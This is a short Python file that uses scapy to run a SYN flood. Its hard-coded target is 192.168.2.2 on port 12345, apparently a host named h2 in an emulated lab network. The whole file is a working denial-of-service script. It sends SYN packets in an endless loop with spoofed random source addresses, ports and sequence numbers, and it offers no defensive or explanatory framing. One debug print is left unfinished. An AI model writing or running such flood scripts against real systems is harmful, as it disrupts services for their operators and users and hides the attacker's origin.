from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits

def syn_flood():
    server_ip = "192.168.2.2"  # h2's IP address
    server_port = 12345  # Port to attack

    print(f"[*] Starting SYN flood attack on {server_ip}:{server_port}...")

    while True:
        # Build the SYN packet
        ip = IP(dst = "192.168.2.2")
        tcp = TCP(dport = int("12345"), flags = 'S')
        pkt = ip/tcp

        # Generate a random source IP and port for spoofing
        pkt[IP].src = str(IPv4Address(getrandbits(32)))
        pkt[TCP].sport = getrandbits(16)
        pkt[TCP].seq = getrandbits(32)

        # Send the SYN packet
        send(pkt, verbose=False)
        print("Sent SYN packet from")

        # Optional: Adjust speed of attack
        time.sleep(0.01)  # 10ms delay to reduce network saturation (adjust as needed)

if __name__ == "__main__":
    #try:
    syn_flood()
    #except KeyboardInterrupt:
        #print("\n[!] Stopping SYN flood attack.")
